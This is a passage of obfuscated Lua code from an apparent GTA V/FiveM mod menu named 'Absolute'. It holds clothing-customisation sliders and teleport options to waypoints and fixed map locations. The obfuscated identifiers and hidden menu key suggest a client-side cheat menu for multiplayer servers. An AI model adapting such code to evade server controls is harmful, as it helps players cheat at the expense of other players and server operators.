                elseif Absolute.MenuButton("Legs Options", "LegsMaker", "~o~>>") then
                elseif Absolute.MenuButton("Accesories Options", "AccesoriesMaker", "~o~>>") then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("AccesoriesMaker") then
                if Absolute.MenuButton("Kneck accesories", "KneckMenu", "~o~>>") then
                elseif Absolute.MenuButton("Clocks", "ClockMenu", "~o~>>") then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("ClockMenu") then
                if
                    Absolute.ComboBoxSlider(
                        "Clock",
                        ClockCBWords,
                        currClockIndex,
                        selClockIndex,
                        function(GVylwS2U1c, tiBy)
                            currClockIndex = GVylwS2U1c
                            selClockIndex = GVylwS2U1c
                            ClockMultiplier = ClockCB[GVylwS2U1c]
                            local VeY3RlV5eJjL = PlayerPedId()
                            actualClock = ClockMultiplier
                            SetPedPropIndex(VeY3RlV5eJjL, 6, ClockMultiplier, 1, 1)
                        end
                    )
                 then
                elseif
                    Absolute.ComboBoxSlider(
                        "Clock Color",
                        ClockexCBWords,
                        currClockexIndex,
                        selClockexIndex,
                        function(BmFEU5uSwTxXuqaH7s3b, xHpwHIMEAydDOi7n4Li)
                            currClockexIndex = BmFEU5uSwTxXuqaH7s3b
                            selClockexIndex = BmFEU5uSwTxXuqaH7s3b
                            ClockexMultiplier = ClockexCB[BmFEU5uSwTxXuqaH7s3b]
                            local BRSms1VdtVtC = PlayerPedId()
                            SetPedPropIndex(BRSms1VdtVtC, 6, actualClock, ClockexMultiplier, 1)
                        end
                    )
                 then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("KneckMenu") then
                if
                    Absolute.ComboBoxSlider(
                        "Kneck",
                        KneckCBWords,
                        currKneckIndex,
                        selKneckIndex,
                        function(Odk3FKMO0ts, _mdTVeeb7RWiyMYt)
                            currKneckIndex = Odk3FKMO0ts
                            selKneckIndex = Odk3FKMO0ts
                            KneckMultiplier = KneckCB[Odk3FKMO0ts]
                            local JfxJbIHiLb = PlayerPedId()
                            actualKneck = KneckMultiplier
                            SetPedComponentVariation(JfxJbIHiLb, 7, KneckMultiplier, 1, 1)
                        end
                    )
                 then
                elseif
                    Absolute.ComboBoxSlider(
                        "Kneck Color",
                        KneckexCBWords,
                        currKneckexIndex,
                        selKneckexIndex,
                        function(VZL9GhY, yxBGSmdp8vwL)
                            currKneckexIndex = VZL9GhY
                            selKneckexIndex = VZL9GhY
                            KneckexMultiplier = KneckexCB[VZL9GhY]
                            local IcRlTvCLEnwuqizMhp = PlayerPedId()
                            SetPedComponentVariation(IcRlTvCLEnwuqizMhp, 7, actualKneck, KneckexMultiplier, 1)
                        end
                    )
                 then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("LegsMaker") then
                if Absolute.MenuButton("Legs", "LegsMenu", "~o~>>") then
                elseif Absolute.MenuButton("Shoes", "ShoesMenu", "~o~>>") then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("ShoesMenu") then
                if
                    Absolute.ComboBoxSlider(
                        "Shoes",
                        ShoesCBWords,
                        currShoesIndex,
                        selShoesIndex,
                        function(U, bqrde96polOWzE2r9)
                            currShoesIndex = U
                            selShoesIndex = U
                            ShoesMultiplier = ShoesCB[U]
                            local AXGO0nk4eZn2yM = PlayerPedId()
                            actualShoes = ShoesMultiplier
                            SetPedComponentVariation(AXGO0nk4eZn2yM, 6, ShoesMultiplier, 1, 1)
                        end
                    )
                 then
                elseif
                    Absolute.ComboBoxSlider(
                        "Shoes Color",
                        ShoesexCBWords,
                        currShoesexIndex,
                        selShoesexIndex,
                        function(mVYFyos8Wtj2P8ac4fJ, QoKCGpyho9GcJNm7VL_2C)
                            currShoesexIndex = mVYFyos8Wtj2P8ac4fJ
                            selShoesexIndex = mVYFyos8Wtj2P8ac4fJ
                            ShoesexMultiplier = ShoesexCB[mVYFyos8Wtj2P8ac4fJ]
                            local HpqIZ2uJGS0qq = PlayerPedId()
                            SetPedComponentVariation(HpqIZ2uJGS0qq, 6, actualShoes, ShoesexMultiplier, 1)
                        end
                    )
                 then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("LegsMenu") then
                if
                    Absolute.ComboBoxSlider(
                        "Pants",
                        PantsCBWords,
                        currPantsIndex,
                        selPantsIndex,
                        function(GcKWr6CsO, nmCOyTKpDNVQogFZ5Qa)
                            currPantsIndex = GcKWr6CsO
                            selPantsIndex = GcKWr6CsO
                            PantsMultiplier = PantsCB[GcKWr6CsO]
                            local DpGWQANSqQOBh = PlayerPedId()
                            actualPants = PantsMultiplier
                            SetPedComponentVariation(DpGWQANSqQOBh, 4, PantsMultiplier, 1, 1)
                        end
                    )
                 then
                elseif
                    Absolute.ComboBoxSlider(
                        "Pants Texture",
                        PantsexCBWords,
                        currPantsexIndex,
                        selPantsexIndex,
                        function(UB5ThG5YEfyPIlJ3, P)
                            currPantsexIndex = UB5ThG5YEfyPIlJ3
                            selPantsexIndex = UB5ThG5YEfyPIlJ3
                            PantsexMultiplier = PantsexCB[UB5ThG5YEfyPIlJ3]
                            local b = PlayerPedId()
                            SetPedComponentVariation(b, 4, actualPants, PantsexMultiplier, 1)
                        end
                    )
                 then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("TorsoMaker") then
                if Absolute.MenuButton("Torso", "TorsoMenu", "~o~>>") then
                elseif Absolute.MenuButton("T-Shirt", "TshirtMenu", "~o~>>") then
                elseif Absolute.MenuButton("Hands/gloves", "HandsMenu", "~o~>>") then
                elseif Absolute.MenuButton("Bags", "BagMenu", "~o~>>") then
                elseif Absolute.MenuButton("Body Armor", "BodyArmorMenu", "~o~>>") then
                elseif Absolute.MenuButton("Stickers", "StickersMenu", "~o~>>") then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("TorsoMenu") then
                if
                    Absolute.ComboBoxSlider(
                        "Torso",
                        TorsodosCBWords,
                        currTorsodosIndex,
                        selTorsodosIndex,
                        function(MCCgE, v72kBMcUWAYo)
                            currTorsodosIndex = MCCgE
                            selTorsodosIndex = MCCgE
                            TorsodosMultiplier = TorsodosCB[MCCgE]
                            local e = PlayerPedId()
                            actualTorsodos = TorsodosMultiplier
                            SetPedComponentVariation(e, 11, TorsodosMultiplier, 1, 1)
                        end
                    )
                 then
                elseif
                    Absolute.ComboBoxSlider(
                        "Torso Texture",
                        TorsodosexCBWords,
                        currTorsodosexIndex,
                        selTorsodosexIndex,
                        function(e, ExyCEHBI9U)
                            currTorsodosexIndex = e
                            selTorsodosexIndex = e
                            TorsodosexMultiplier = TorsodosexCB[e]
                            local S = PlayerPedId()
                            SetPedComponentVariation(S, 11, actualTorsodos, TorsodosexMultiplier, 1)
                        end
                    )
                 then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("TshirtMenu") then
                if
                    Absolute.ComboBoxSlider(
                        "T-Shirt",
                        ShirtCBWords,
                        currShirtIndex,
                        selShirtIndex,
                        function(UY_, HdAsw5xv2Obu)
                            currShirtIndex = UY_
                            selShirtIndex = UY_
                            ShirtMultiplier = ShirtCB[UY_]
                            local esqBAYqzh0kBmmSo8 = PlayerPedId()
                            actualShirt = ShirtMultiplier
                            SetPedComponentVariation(esqBAYqzh0kBmmSo8, 8, ShirtMultiplier, 1, 1)
                        end
                    )
                 then
                elseif
                    Absolute.ComboBoxSlider(
                        "T-Shirt Texture",
                        ShirtexCBWords,
                        currShirtexIndex,
                        selShirtexIndex,
                        function(WwELy85fLFTWY6ATL8W, QaAqDjfuvcC8itIsKKy5g)
                            currShirtexIndex = WwELy85fLFTWY6ATL8W
                            selShirtexIndex = WwELy85fLFTWY6ATL8W
                            ShirtexMultiplier = ShirtexCB[WwELy85fLFTWY6ATL8W]
                            local oj9NB2C4SY34K2aZyEXd = PlayerPedId()
                            SetPedComponentVariation(oj9NB2C4SY34K2aZyEXd, 8, actualShirt, ShirtexMultiplier, 1)
                        end
                    )
                 then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("HandsMenu") then
                if
                    Absolute.ComboBoxSlider(
                        "Hands",
                        HandsCBWords,
                        currHandsIndex,
                        selHandsIndex,
                        function(dQp, u8vmHcgaE4)
                            currHandsIndex = dQp
                            selHandsIndex = dQp
                            HandsMultiplier = HandsCB[dQp]
                            local QC4r9i5Z0 = PlayerPedId()
                            actualHands = HandsMultiplier
                            SetPedComponentVariation(QC4r9i5Z0, 3, HandsMultiplier, 1, 1)
                        end
                    )
                 then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("BagMenu") then
                if
                    Absolute.ComboBoxSlider(
                        "Bag",
                        BagCBWords,
                        currBagIndex,
                        selBagIndex,
                        function(C3, C1pxjPBp_TS)
                            currBagIndex = C3
                            selBagIndex = C3
                            BagMultiplier = BagCB[C3]
                            local ski = PlayerPedId()
                            actualBag = BagMultiplier
                            SetPedComponentVariation(ski, 5, BagMultiplier, 1, 1)
                        end
                    )
                 then
                elseif
                    Absolute.ComboBoxSlider(
                        "Bag Color",
                        BagexCBWords,
                        currBagexIndex,
                        selBagexIndex,
                        function(eYL8yL4RfLeOmXkaU_OLK, aDHjaFjAl4LXO)
                            currBagexIndex = eYL8yL4RfLeOmXkaU_OLK
                            selBagexIndex = eYL8yL4RfLeOmXkaU_OLK
                            BagexMultiplier = BagexCB[eYL8yL4RfLeOmXkaU_OLK]
                            local o6JC7mDVyqsQJVyNi8mIJ = PlayerPedId()
                            SetPedComponentVariation(o6JC7mDVyqsQJVyNi8mIJ, 5, actualBag, BagexMultiplier, 1)
                        end
                    )
                 then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("BodyArmorMenu") then
                if
                    Absolute.ComboBoxSlider(
                        "Body Armor",
                        BodyArmorCBWords,
                        currBodyArmorIndex,
                        selBodyArmorIndex,
                        function(Iiwt7p57_v0DjEE__QuM, Gp9Ac)
                            currBodyArmorIndex = Iiwt7p57_v0DjEE__QuM
                            selBodyArmorIndex = Iiwt7p57_v0DjEE__QuM
                            BodyArmorMultiplier = BodyArmorCB[Iiwt7p57_v0DjEE__QuM]
                            local wtPlv_WWj = PlayerPedId()
                            actualBodyArmor = BodyArmorMultiplier
                            SetPedComponentVariation(wtPlv_WWj, 9, BodyArmorMultiplier, 1, 1)
                        end
                    )
                 then
                elseif
                    Absolute.ComboBoxSlider(
                        "Body Armor Color",
                        BodyArmorexCBWords,
                        currBodyArmorexIndex,
                        selBodyArmorexIndex,
                        function(k0bOwoo2hxPE, HNNidmR28F7qY)
                            currBodyArmorexIndex = k0bOwoo2hxPE
                            selBodyArmorexIndex = k0bOwoo2hxPE
                            BodyArmorexMultiplier = BodyArmorexCB[k0bOwoo2hxPE]
                            local TvMgmGmFOiDem2QS5 = PlayerPedId()
                            SetPedComponentVariation(TvMgmGmFOiDem2QS5, 9, actualBodyArmor, BodyArmorexMultiplier, 1)
                        end
                    )
                 then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("StickersMenu") then
                if
                    Absolute.ComboBoxSlider(
                        "Stickers",
                        StickersCBWords,
                        currStickersIndex,
                        selStickersIndex,
                        function(Oe6N, qtWZZiX_Hfh)
                            currStickersIndex = Oe6N
                            selStickersIndex = Oe6N
                            StickersMultiplier = StickersCB[Oe6N]
                            local HDO1PVaDqHn819C = PlayerPedId()
                            actualStickers = StickersMultiplier
                            SetPedComponentVariation(HDO1PVaDqHn819C, 10, StickersMultiplier, 1, 1)
                        end
                    )
                 then
                elseif
                    Absolute.ComboBoxSlider(
                        "Stickers Design",
                        StickersexCBWords,
                        currStickersexIndex,
                        selStickersexIndex,
                        function(OviRGSKhzNl07lDR, bDfWcqe0cb1lI)
                            currStickersexIndex = OviRGSKhzNl07lDR
                            selStickersexIndex = OviRGSKhzNl07lDR
                            StickersexMultiplier = StickersexCB[OviRGSKhzNl07lDR]
                            local Zqh0idZe = PlayerPedId()
                            SetPedComponentVariation(Zqh0idZe, 10, actualStickers, StickersexMultiplier, 1)
                        end
                    )
                 then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("HeadMenu") then
                if Absolute.MenuButton("Hats", "HatMenu", "~o~>>") then
                elseif Absolute.MenuButton("Glasses", "GlassesMenu", "~o~>>") then
                elseif Absolute.MenuButton("Ear", "EarMenu", "~o~>>") then
                elseif Absolute.MenuButton("Mask", "MaskMenu", "~o~>>") then
                elseif Absolute.MenuButton("Hair", "HairMenu", "~o~>>") then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("HatMenu") then
                if
                    Absolute.ComboBoxSlider(
                        "Hat",
                        HatCBWords,
                        currHatIndex,
                        selHatIndex,
                        function(ohI5NF6zocpE, d5ix5NUVduUsPR)
                            currHatIndex = ohI5NF6zocpE
                            selHatIndex = ohI5NF6zocpE
                            HatMultiplier = HatCB[ohI5NF6zocpE]
                            local DBS = PlayerPedId()
                            actualhat = HatMultiplier
                            SetPedPropIndex(DBS, 0.0, HatMultiplier, 1, 1)
                        end
                    )
                 then
                elseif
                    Absolute.ComboBoxSlider(
                        "Hat Texture",
                        HatexCBWords,
                        currHatexIndex,
                        selHatexIndex,
                        function(fJFYZp98xHd40mAgG, PZdV4Bb5XsJC)
                            currHatexIndex = fJFYZp98xHd40mAgG
                            selHatexIndex = fJFYZp98xHd40mAgG
                            HatexMultiplier = HatexCB[fJFYZp98xHd40mAgG]
                            local xuBSQ = PlayerPedId()
                            SetPedPropIndex(xuBSQ, 0.0, actualhat, HatexMultiplier, 1)
                        end
                    )
                 then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("GlassesMenu") then
                if
                    Absolute.ComboBoxSlider(
                        "Glasses",
                        GlassesCBWords,
                        currGlassesIndex,
                        selGlassesIndex,
                        function(EIcpJZg, X)
                            currGlassesIndex = EIcpJZg
                            selGlassesIndex = EIcpJZg
                            GlassesMultiplier = HatCB[EIcpJZg]
                            local p4B = PlayerPedId()
                            actualGlasses = GlassesMultiplier
                            SetPedPropIndex(p4B, 1, GlassesMultiplier, 1, 1)
                        end
                    )
                 then
                elseif
                    Absolute.ComboBoxSlider(
                        "Glasses Texture",
                        GlassesexCBWords,
                        currGlassesexIndex,
                        selGlassesexIndex,
                        function(ALV_9VdoelsOS, AWJyxA2AXt)
                            currGlassesexIndex = ALV_9VdoelsOS
                            selGlassesexIndex = ALV_9VdoelsOS
                            GlassesexMultiplier = GlassesexCB[ALV_9VdoelsOS]
                            local GQIYCBfaWimo1Fku_hwg = PlayerPedId()
                            SetPedPropIndex(GQIYCBfaWimo1Fku_hwg, 1, actualGlasses, GlassesexMultiplier, 1)
                        end
                    )
                 then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("EarMenu") then
                if
                    Absolute.ComboBoxSlider(
                        "Ear",
                        EarCBWords,
                        currEarIndex,
                        selEarIndex,
                        function(EpMSzvMXA_W, ZDbdHcYt2Lm)
                            currEarIndex = EpMSzvMXA_W
                            selEarIndex = EpMSzvMXA_W
                            EarMultiplier = EarCB[EpMSzvMXA_W]
                            local lnbKN7DX3 = PlayerPedId()
                            actualEar = EarMultiplier
                            SetPedPropIndex(lnbKN7DX3, 2, EarMultiplier, 1, 1)
                        end
                    )
                 then
                elseif
                    Absolute.ComboBoxSlider(
                        "Ear Texture",
                        EarexCBWords,
                        currEarexIndex,
                        selEarexIndex,
                        function(nahFaZC2, qjx)
                            currEarexIndex = nahFaZC2
                            selEarexIndex = nahFaZC2
                            EarexMultiplier = EarexCB[nahFaZC2]
                            local nWdVEo4AW9LStiCUkZwwP = PlayerPedId()
                            SetPedPropIndex(nWdVEo4AW9LStiCUkZwwP, 2, actualEar, EarexMultiplier, 1)
                        end
                    )
                 then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("MaskMenu") then
                if
                    Absolute.ComboBoxSlider(
                        "Mask",
                        MaskCBWords,
                        currMaskIndex,
                        selMaskIndex,
                        function(eOGaX29LJV, F)
                            currMaskIndex = eOGaX29LJV
                            selMaskIndex = eOGaX29LJV
                            MaskMultiplier = MaskCB[eOGaX29LJV]
                            local dql4882CIwB7gKd = PlayerPedId()
                            actualMask = MaskMultiplier
                            SetPedComponentVariation(dql4882CIwB7gKd, 1, MaskMultiplier, 1, 1)
                        end
                    )
                 then
                elseif
                    Absolute.ComboBoxSlider(
                        "Mask Design",
                        MaskexCBWords,
                        currMaskexIndex,
                        selMaskexIndex,
                        function(q8ZOYINWbTG3vB, hmnaJhyNNou8xY)
                            currMaskexIndex = q8ZOYINWbTG3vB
                            selMaskexIndex = q8ZOYINWbTG3vB
                            MaskexMultiplier = MaskexCB[q8ZOYINWbTG3vB]
                            local jaM0g = PlayerPedId()
                            SetPedComponentVariation(jaM0g, 1, actualMask, MaskexMultiplier, 1)
                        end
                    )
                 then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("HairMenu") then
                if
                    Absolute.ComboBoxSlider(
                        "Hair",
                        HairCBWords,
                        currHairIndex,
                        selHairIndex,
                        function(w, b9uW4wWOO_6cuphyTQ)
                            currHairIndex = w
                            selHairIndex = w
                            HairMultiplier = HairCB[w]
                            local nDVbAMmxi7uN = PlayerPedId()
                            actualHair = HairMultiplier
                            SetPedComponentVariation(nDVbAMmxi7uN, 2, HairMultiplier, 1, 1)
                        end
                    )
                 then
                elseif
                    Absolute.ComboBoxSlider(
                        "Hair Design",
                        HairexCBWords,
                        currHairexIndex,
                        selHairexIndex,
                        function(eBn_oN7HLJbGZYq, s7VdzUUbRcPHezdd6)
                            currHairexIndex = eBn_oN7HLJbGZYq
                            selHairexIndex = eBn_oN7HLJbGZYq
                            HairexMultiplier = HairexCB[eBn_oN7HLJbGZYq]
                            local e3H2wXg4shFziIkULi9 = PlayerPedId()
                            SetPedComponentVariation(e3H2wXg4shFziIkULi9, 2, actualHair, HairexMultiplier, 1)
                        end
                    )
                 then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("TeleportMenu") then
                if Absolute.Button("Teleport To Waypoint") then
                    WPTP()
                elseif Absolute.CheckBox("Show coords", showCoords) then
                    showCoords = not showCoords
                elseif Absolute.CheckBox("Live teleport", TeleportLive) then
                    TeleportLive = not TeleportLive
                elseif
                    Absolute.ComboBox(
                        "Live teleport distance",
                        Mlf_aylZ60ZaoIHuj,
                        currLiveTPFuncIndex,
                        selLiveTPFuncIndex,
                        function(bgFosFPBw, Q5gQngM333rzIRuR7o)
                            currLiveTPFuncIndex = bgFosFPBw
                            selLiveTPFuncIndex = Q5gQngM333rzIRuR7o
                        end
                    )
                 then
                elseif
                    Absolute.Button(
                        "    ~o~ ---------------------------------------------------------------------------------   "
                    )
                 then
                    I0oW9H("~g~This is just a divisor :)")
                elseif Absolute.MenuButton("Clothes Store", "ClothingStores", "~o~>>") then
                elseif Absolute.MenuButton("Barbery Shops", "BarberShops", "~o~>>") then
                elseif Absolute.MenuButton("Airports", "Airports", "~o~>>") then
                elseif Absolute.MenuButton("Garages", "Garages", "~o~>>") then
                elseif Absolute.MenuButton("Ammu-Nation`s", "Ammunation", "~o~>>") then
                elseif Absolute.MenuButton("Cinemas", "Cinemas", "~o~>>") then
                elseif Absolute.Button("Vanilla Unicorn") then
                    local xSe = GetPlayerPed(-1)
                    SetEntityCoords(xSe, 135.5, -1308.3, 28.3)
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("ClothingStores") then
                if Absolute.Button("~p~UNKWN ~g~-~s~ Paleto Bay") then
                    TeleportToCertainPoint(-4.5, 6521.2, 30.5)
                elseif Absolute.Button("~p~UNKWN ~g~-~s~ Zancudo") then
                    TeleportToCertainPoint(1678.05, 4819.88, 41.29)
                elseif Absolute.Button("~p~UNKWN ~g~-~s~ Sandy Shores") then
                    TeleportToCertainPoint(1179.67, 2691.37, 15.4)
                elseif Absolute.Button("~p~UNKWN ~g~-~s~ Strawberry") then
                    TeleportToCertainPoint(89.320786, -1392.317627, 30.4)
                elseif Absolute.Button("~p~UNKWN ~g~-~s~ Great Chaparral") then
                    TeleportToCertainPoint(-1089.4, 2697.03, 19.44)
                elseif Absolute.Button("~b~SUBURBAN ~g~- ~s~Havick ") then
                    TeleportToCertainPoint(134.122055, -200.21133, 53.86409)
                elseif Absolute.Button("~b~SUBURBAN ~g~- ~s~Del Perro ") then
                    TeleportToCertainPoint(-1210.620361, -784.16021, 16.549015)
                elseif Absolute.Button("~r~PONSONBYS ~g~- ~s~Burton ") then
                    TeleportToCertainPoint(-148.234741, -308.07, 38.104)
                elseif Absolute.Button("~r~PONSONBYS ~g~- ~s~Rockford Hills ") then
                    TeleportToCertainPoint(-725.551453, -162.83371, 36.57)
                elseif Absolute.Button("~r~PONSONBYS ~g~- ~s~MorningWood ") then
                    TeleportToCertainPoint(-1460.654, -227.55, 48.72)
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("BarberShops") then
                if Absolute.Button("Havick") then
                    TeleportToCertainPoint(-27.79, -136.86, 56.51)
                elseif Absolute.Button("Rockford Hills") then
                    TeleportToCertainPoint(-829.42, -191.58, 36.92)
                elseif Absolute.Button("Vespucci") then
                    TeleportToCertainPoint(-1294.99, -1117.64, 6.15)
                elseif Absolute.Button("Mirror Park") then
                    TeleportToCertainPoint(1198.02, -471.81, 65.67)
                elseif Absolute.Button("Davis") then
                    TeleportToCertainPoint(127.76, -1718.65, 28.65)
                elseif Absolute.Button("Paleto Bay") then
                    TeleportToCertainPoint(-286.63, 6239.38, 30.56)
                elseif Absolute.Button("Sandy Shores") then
                    TeleportToCertainPoint(1938.35, 3717.8, 31.6)
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("Airports") then
                if Absolute.Button("Los Santos Airport") then
                    TeleportToCertainPoint(-1070.9, -2972.122, 13.77)
                elseif Absolute.Button("Flight School") then
                    TeleportToCertainPoint(-1142, -2697.3, 13.77)
                elseif Absolute.Button("Sandy Shores") then
                    TeleportToCertainPoint(1682.19, 3279.98, 40.6)
                elseif Absolute.Button("McKenzie Airfield") then
                    TeleportToCertainPoint(2124.62, 4805.27, 40.47)
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("Garages") then
                if Absolute.Button("Mort Mutual Insurance") then
                    TeleportToCertainPoint(-221.74, -1158.24, 23.04)
                elseif Absolute.Button("Bennys Garage") then
                    TeleportToCertainPoint(-196.34, -1303.1, 30.65)
                elseif Absolute.Button("Beekers Garage") then
                    TeleportToCertainPoint(116.22, 6606.2, 31.46)
                elseif Absolute.Button("Sandy Shores") then
                    TeleportToCertainPoint(1176.82, 2657.97, 37.37)
                elseif Absolute.Button("Grand Senora Dust") then
                    TeleportToCertainPoint(1173.45, 2661.58, 37.28)
                elseif Absolute.Button("Burton") then
                    TeleportToCertainPoint(-370.53, -130.4, 38.19)
                elseif Absolute.Button("Little Seoul Car Wash") then
                    TeleportToCertainPoint(-701.82, -921.92, 18.58)
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("Ammunation") then
                if Absolute.Button("Paleto Bay") then
                    TeleportToCertainPoint(-318.85, 6074.43, 30.614)
                elseif Absolute.Button("Sandy Shores") then
                    TeleportToCertainPoint(1704.67, 3748.88, 33.28)
                elseif Absolute.Button("Great Chaparral") then
                    TeleportToCertainPoint(-1108.6, 2685.69, 18.17)
                elseif Absolute.Button("Chumash") then
                    TeleportToCertainPoint(-1108.6, 2685.69, 18.17)
                elseif Absolute.Button("Palomino Fwy") then
                    TeleportToCertainPoint(2571.371, 313.879, 107.97)
                elseif Absolute.Button("Hawick") then
                    TeleportToCertainPoint(235.66, -42.26, 69.22)
                elseif Absolute.Button("Morningwood") then
                    TeleportToCertainPoint(-1328.592896, -387.11441, 36.126881)
                elseif Absolute.Button("Little Seoul") then
                    TeleportToCertainPoint(-665.232727, -952.522522, 20.866556)
                elseif Absolute.Button("La Mesa") then
                    TeleportToCertainPoint(844.439026, -1009.422424, 27.511728)
                elseif Absolute.Button("Pillbox Hill") then
                    TeleportToCertainPoint(17.37779, -1122.183105, 28.469843)
                elseif Absolute.Button("Cypress Flats") then
                    TeleportToCertainPoint(814.442017, -2130.448486, 28.867798)
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("Cinemas") then
                if Absolute.Button("Vinewood") then
                    local AGr861BFU9PBNmP = GetPlayerPed(-1)
                    TeleportToCertainPoint(300.407776, 193.05107, 103.590019)
                elseif Absolute.Button("Ten Cent") then
                    local fQyezsZ = GetPlayerPed(-1)
                    TeleportToCertainPoint(401.796816, -713.924988, 28.56971)
                elseif Absolute.Button("Morningwood") then
                    TeleportToCertainPoint(-1410.07, -199.047531, 46.5025)
                end
                Absolute.Display()
            elseif IsDisabledControlJustReleased(0.0, 314) or IsDisabledControlJustReleased(0.0, 0.0) then
                Absolute.OpenMenu("MainMenu")
            end
            Citizen.Wait(0.0)
        end
    end
)
